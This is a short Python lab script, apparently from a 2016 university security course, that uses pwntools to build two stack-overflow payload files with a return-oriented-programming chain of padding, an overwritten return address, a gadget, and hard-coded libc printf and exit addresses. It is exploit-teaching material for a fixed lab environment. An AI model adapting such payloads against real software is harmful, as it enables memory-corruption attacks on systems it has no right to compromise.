#!/usr/bin/env python3
# Simple Python script to generate shellcode for Lab5
# Nils, SUTD, 2016

from pwn import *

# lenfill offset determined by finding the rip offset using pattern
# 72 - original offset of rip
# -8 for rbp length 
# -14 for hello world string offset
lenfill = 72-8-14

# hello world string in hex
string = b'\x48\x65\x6c\x6c\x6f\x2c\x20\x77\x6f\x72\x6c\x64\x21\x00'

# Set up return address. pwnlib is used to turn int to string

storedRBP = p64(0x4444444444444444)  # DDDDDDDD in hex

# gadget instruction address, found usingropsearch 
storedRIP = p64(0x00007ffff7b510c8)  

# libc printf and exit instruction address found using "p <libc-function>"
printf_addr = p64(0x00007ffff7a62800)
exit_addr = p64(0x00007ffff7a47030)

# string address found by examining stack
string_addr = p64(0x00007fffffffe3c2)
string_addr_shell = p64(0x00007fffffffe432) #string address for shell

with open('payloadROP','wb') as f:
    f.write(b'A' * lenfill + string + storedRBP + storedRIP + string_addr + printf_addr
            + exit_addr + b'\n')

with open('payloadROPshell','wb') as f:
    f.write(b'A' * lenfill + string + storedRBP + storedRIP + string_addr_shell + printf_addr
            + exit_addr + b'\n')


